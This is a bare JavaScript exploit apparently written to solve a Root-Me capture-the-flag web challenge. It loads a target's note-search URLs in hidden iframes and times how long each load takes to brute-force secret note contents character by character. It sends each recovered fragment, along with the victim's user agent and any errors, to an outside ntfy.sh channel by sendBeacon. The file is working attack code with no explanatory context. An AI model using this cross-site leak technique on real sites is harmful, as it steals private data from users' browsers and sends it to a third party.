const B='https://web-client-ch56.challenge01.root-me.org:58056/';
const N='https://ntfy.sh/wcxleak56a';
const T0=Date.now(),EL=()=>Date.now()-T0;
const log=s=>{try{navigator.sendBeacon(N,s)}catch(e){}};
const logj=o=>log(JSON.stringify(Object.assign({t:Math.round(EL()/100)/10},o)));
onerror=(m,s,l)=>{logj({jserr:''+m+' L'+l})};
onunhandledrejection=e=>{logj({rej:''+e.reason})};
const CHARS='abcdefghijklmnopqrstuvwxyz0123456789-_ ';
let rid=0;
function probe1(id,q){return new Promise(res=>{const f=document.createElement('iframe');const st=Date.now();let fin=0;
 const done=v=>{if(!fin){fin=1;try{f.remove()}catch(e){}res(v)}};
 f.style.cssText='display:none';
 f.onload=()=>done(Date.now()-st);f.onerror=()=>done(9999);setTimeout(()=>done(9998),9000);
 f.src=B+'notes/'+id+'/'+encodeURIComponent(q)+'?v='+T0+'x'+(rid++);
 document.body.appendChild(f);});}
async function probe(id,q){const a=await probe1(id,q);if(a<1300||a>6000)return a;const b=await probe1(id,q);return b;}
async function wave(ids,p){
 const out={};
 await Promise.all(ids.map(async id=>{
  const r=await Promise.all(CHARS.split('').map(async c=>[c,await probe(id,p+c)]));
  const s=r.slice().sort((x,y)=>x[1]-y[1]);
  out[id]=r.filter(x=>x[1]>1300&&x[1]<6000).map(x=>x[0]);
  out['d'+id]=s[0][1]+'/'+s[19][1]+'/'+s[38][1];
 }));
 return out;
}
(async()=>{
 logj({ev:'start',ua:navigator.userAgent});
 const hbt=setInterval(()=>logj({ev:'hb'}),7000);setTimeout(()=>clearInterval(hbt),28000);
 const ids=[300,600,900,1200,1500,1800,2100,2250,2400,2600,2800,3000];
 let frontier={},seen={};
 for(let k=0;k<ids.length;k+=6){
  if(EL()>21000)logj({sweeptimeout:k});if(EL()>21000)break;
  const res=await wave(ids.slice(k,k+6),'');
  for(const id in res){if(id[0]==='d')continue;
   const h=res[id];
   frontier[id]=h;
   logj({id:+id,r1:h.join('')||'-'});
  }
 }
 logj({ev:'r1done',f:JSON.stringify(frontier).length>0});
 const nodes=[];
 for(const id in frontier)for(const c of frontier[id])nodes.push([+id,c]);
 for(let d=0;d<40&&nodes.length;d++){
  const nf=[],exts={},ends=[];
  for(const[id,p]of nodes){
   const k2=id+'|'+p;if(seen[k2])continue;seen[k2]=1;
   if(EL()>26000){logj({cut:id+'~'+p});continue;}
   const res=await wave([id],p);
   const h=res[id];
   exts[id+'~'+p]=h.join('')||'-';
   if(!h.length)ends.push(id+'~'+p);
   for(const c of h)nf.push([id,p+c]);
  }
  nodes=nf;if(nf.length>24)nodes=nf.slice(0,24);
  logj({lvl:d,exts:exts,ends:ends,n:nf.length});
 }
 logj({ev:'done'});
})();
